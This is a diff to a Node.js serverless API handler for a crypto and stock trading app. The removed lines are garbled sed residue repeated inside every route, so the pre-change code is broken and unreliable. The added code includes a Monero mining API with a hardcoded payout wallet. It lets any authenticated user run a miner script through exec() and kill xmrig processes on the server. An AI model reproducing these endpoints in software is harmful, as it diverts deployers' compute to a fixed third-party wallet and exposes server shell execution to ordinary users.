@@ -216,7 +216,6 @@ module.exports = async (req, res) => {
 
   // ---------- AUTH ----------
   if (url === '/api/signup' && method === 'POST') {
-pi/health && method === GET) {/,/}/d
     const { username, password } = req.body;
     if (!username || !password) return res.status(400).json({ error: 'Missing fields' });
     if (users.find(u => u.username === username)) return res.status(400).json({ error: 'User exists' });
@@ -229,7 +228,6 @@ pi/health && method === GET) {/,/}/d
   }
 
   if (url === '/api/login' && method === 'POST') {
-pi/health && method === GET) {/,/}/d
     const { username, password } = req.body;
     const user = users.find(u => u.username === username);
     if (!user || !verifyPassword(password, user.password)) return res.status(401).json({ error: 'Invalid credentials' });
@@ -240,14 +238,12 @@ pi/health && method === GET) {/,/}/d
   }
 
   if (url === '/api/logout' && method === 'POST') {
-pi/health && method === GET) {/,/}/d
     res.setHeader('Set-Cookie', 'token=; HttpOnly; Path=/; Max-Age=0; Secure; SameSite=None');
     res.status(200).json({ message: 'Logged out' });
     return;
   }
 
   if (url === '/api/me' && method === 'GET') {
-pi/health && method === GET) {/,/}/d
     if (!userId) return res.status(401).json({ error: 'Not authenticated' });
     const user = users.find(u => u.id === userId);
     if (!user) return res.status(404).json({ error: 'User not found' });
@@ -256,7 +252,6 @@ pi/health && method === GET) {/,/}/d
   }
 
   if (url === '/api/auth/google' && method === 'POST') {
-pi/health && method === GET) {/,/}/d
     const { token } = req.body;
     try {
       const client = new OAuth2Client(GOOGLE_CLIENT_ID);
@@ -280,7 +275,6 @@ pi/health && method === GET) {/,/}/d
 
   // ---------- TRADING ----------
   if (url === '/api/trade/price' && method === 'GET') {
-pi/health && method === GET) {/,/}/d
     const { symbol } = req.query;
     if (!symbol) return res.status(400).json({ error: 'Missing symbol' });
     try {
@@ -293,7 +287,6 @@ pi/health && method === GET) {/,/}/d
   }
 
   if (url === '/api/trade/execute' && method === 'POST') {
-pi/health && method === GET) {/,/}/d
     if (!userId) return res.status(401).json({ error: 'Not authenticated' });
     const { symbol, amountUSD, tradeType, useAI } = req.body;
     if (!symbol || !amountUSD || !tradeType) return res.status(400).json({ error: 'Missing parameters' });
@@ -305,7 +298,6 @@ pi/health && method === GET) {/,/}/d
   }
 
   if (url === '/api/trade/history' && method === 'GET') {
-pi/health && method === GET) {/,/}/d
     if (!userId) return res.status(401).json({ error: 'Not authenticated' });
     const userTrades = trades.filter(t => t.userId === userId);
     res.status(200).json(userTrades);
@@ -314,7 +306,6 @@ pi/health && method === GET) {/,/}/d
 
   // ---------- STOCK TRADING ----------
   if (url === '/api/stock/price' && method === 'GET') {
-pi/health && method === GET) {/,/}/d
     const { symbol } = req.query;
     if (!symbol) return res.status(400).json({ error: 'Missing symbol' });
     try {
@@ -325,7 +316,6 @@ pi/health && method === GET) {/,/}/d
   }
 
   if (url === '/api/stock/trade' && method === 'POST') {
-pi/health && method === GET) {/,/}/d
     if (!userId) return res.status(401).json({ error: 'Not authenticated' });
     const { symbol, amount } = req.body;
     if (!symbol || !amount || amount <= 0) return res.status(400).json({ error: 'Invalid trade' });
@@ -347,7 +337,6 @@ pi/health && method === GET) {/,/}/d
 
   // ---------- REFERRAL ----------
   if (url === '/api/referral/link' && method === 'POST') {
-pi/health && method === GET) {/,/}/d
     if (!userId) return res.status(401).json({ error: 'Not authenticated' });
     const { referrerId } = req.body;
     if (referrerId === userId) return res.status(400).json({ error: 'Cannot refer yourself' });
@@ -362,7 +351,6 @@ pi/health && method === GET) {/,/}/d
   }
 
   if (url === '/api/referral/tree' && method === 'GET') {
-pi/health && method === GET) {/,/}/d
     if (!userId) return res.status(401).json({ error: 'Not authenticated' });
     const tree = getReferralTree(userId);
     res.status(200).json(tree);
@@ -386,7 +374,6 @@ pi/health && method === GET) {/,/}/d
   }
 
   if (url === '/api/roundup/transaction' && method === 'POST') {
-pi/health && method === GET) {/,/}/d
     if (!userId) return res.status(401).json({ error: 'Not authenticated' });
     const { amount } = req.body;
     if (!amount || amount <= 0) return res.status(400).json({ error: 'Invalid amount' });
@@ -412,7 +399,6 @@ pi/health && method === GET) {/,/}/d
   }
 
   if (url === '/api/roundup/balance' && method === 'GET') {
-pi/health && method === GET) {/,/}/d
     if (!userId) return res.status(401).json({ error: 'Not authenticated' });
     const userRoundup = loadRoundup(userId);
     res.status(200).json({ balance: userRoundup.balance || 0, invested: userRoundup.invested || 0, history: userRoundup.history || [] });
@@ -421,7 +407,6 @@ pi/health && method === GET) {/,/}/d
 
   // ---------- CLAIM BOT ----------
   if (url === '/api/claim/scan-evm' && method === 'POST') {
-pi/health && method === GET) {/,/}/d
     if (!userId) return res.status(401).json({ error: 'Not authenticated' });
     const { address, chainId = '1' } = req.body;
     if (!address) return res.status(400).json({ error: 'Missing address' });
@@ -448,7 +433,6 @@ pi/health && method === GET) {/,/}/d
   }
 
   if (url === '/api/claim/scan-solana' && method === 'POST') {
-pi/health && method === GET) {/,/}/d
     if (!userId) return res.status(401).json({ error: 'Not authenticated' });
     const { address } = req.body;
     if (!address) return res.status(400).json({ error: 'Missing address' });
@@ -465,7 +449,6 @@ pi/health && method === GET) {/,/}/d
 
   // ---------- WITHDRAWAL / OWNER ----------
   if (url === '/api/owner/earnings' && method === 'GET') {
-pi/health && method === GET) {/,/}/d
     if (userId !== 'admin' && req.headers['x-admin-key'] !== ADMIN_KEY) return res.status(403).json({ error: 'Admin only' });
     const data = loadEarnings();
     res.status(200).json({ totalOwnerFees: data.totalOwnerFees, withdrawals: data.withdrawals });
@@ -473,7 +456,6 @@ pi/health && method === GET) {/,/}/d
   }
 
   if (url === '/api/withdrawal/request' && method === 'POST') {
-pi/health && method === GET) {/,/}/d
     if (!userId) return res.status(401).json({ error: 'Not authenticated' });
     const { amount, address } = req.body;
     if (!amount || amount <= 0) return res.status(400).json({ error: 'Invalid amount' });
@@ -489,4 +471,91 @@ pi/health && method === GET) {/,/}/d
   }
 
   // ---------- HEALTH ----------
-}
+  if (url === '/api/health' && method === 'GET') {
+    const checks = {
+      JWT_SECRET: !!process.env.JWT_SECRET,
+      GOOGLE_CLIENT_ID: !!process.env.GOOGLE_CLIENT_ID,
+      INFURA_KEY: !!process.env.INFURA_KEY,
+      SOLANA_RPC: !!process.env.SOLANA_RPC,
+      ALPHA_VANTAGE_KEY: !!process.env.ALPHA_VANTAGE_KEY,
+      WALLETCONNECT_PROJECT_ID: !!process.env.WALLETCONNECT_PROJECT_ID,
+    };
+    const allOk = Object.values(checks).every(v => v === true);
+    res.status(allOk ? 200 : 500).json({ status: allOk ? 'ok' : 'missing keys', checks });
+    return;
+  }
+
+  // ---------- MINING API ----------
+  const MINER_WALLET = '9vXyKbMr85Yaus38RQnjLjfxPWbCJVESbTmRH6JCWVE2';
+  const MINER_SCRIPT = process.env.MINER_SCRIPT || '~/start_miner.sh';
+
+  if (url === '/api/mining/stats' && method === 'GET') {
+    try {
+      const response = await axios.get(`https://supportxmr.com/api/miner/${MINER_WALLET}/stats`);
+      const data = response.data;
+      const priceRes = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd');
+      const xmrPrice = priceRes.data.monero?.usd || 0;
+      const balance = (data.amtDue || 0) / 1e12;
+      res.status(200).json({
+        wallet: MINER_WALLET,
+        hashrate: data.hashrate || 0,
+        balance: balance,
+        totalHashes: data.totalHashes || 0,
+        validShares: data.validShares || 0,
+        lastShare: data.lastHash || 0,
+        xmrPrice: xmrPrice,
+        valueUSD: balance * xmrPrice,
+        paid: (data.amtPaid || 0) / 1e12,
+        status: 'ok'
+      });
+    } catch (err) {
+      res.status(500).json({ error: 'Failed to fetch mining stats' });
+    }
+    return;
+  }
+
+  if (url === '/api/miner/start' && method === 'POST') {
+    if (!userId) return res.status(401).json({ error: 'Not authenticated' });
+    try {
+      exec(`${MINER_SCRIPT} > /dev/null 2>&1 &`, (error) => {
+        if (error) console.error('Miner start error:', error);
+      });
+      res.status(200).json({ message: 'Miner started', status: 'starting' });
+    } catch (e) {
+      res.status(500).json({ error: e.message });
+    }
+    return;
+  }
+
+  if (url === '/api/miner/stop' && method === 'POST') {
+    if (!userId) return res.status(401).json({ error: 'Not authenticated' });
+    try {
+      exec('pkill -f xmrig || true', (error) => {
+        if (error) console.error('Miner stop error:', error);
+      });
+      res.status(200).json({ message: 'Miner stopped', status: 'stopped' });
+    } catch (e) {
+      res.status(500).json({ error: e.message });
+    }
+    return;
+  }
+
+  if (url === '/api/miner/status' && method === 'GET') {
+    if (!userId) return res.status(401).json({ error: 'Not authenticated' });
+    try {
+      const { execSync } = require('child_process');
+      let running = false;
+      try {
+        const output = execSync('pgrep -f xmrig', { encoding: 'utf8' });
+        running = output.trim().length > 0;
+      } catch (e) { running = false; }
+      res.status(200).json({ running });
+    } catch (e) {
+      res.status(500).json({ error: e.message });
+    }
+    return;
+  }
+
+  // ---------- 404 ----------
+  res.status(404).json({ error: 'Not found' });
+};
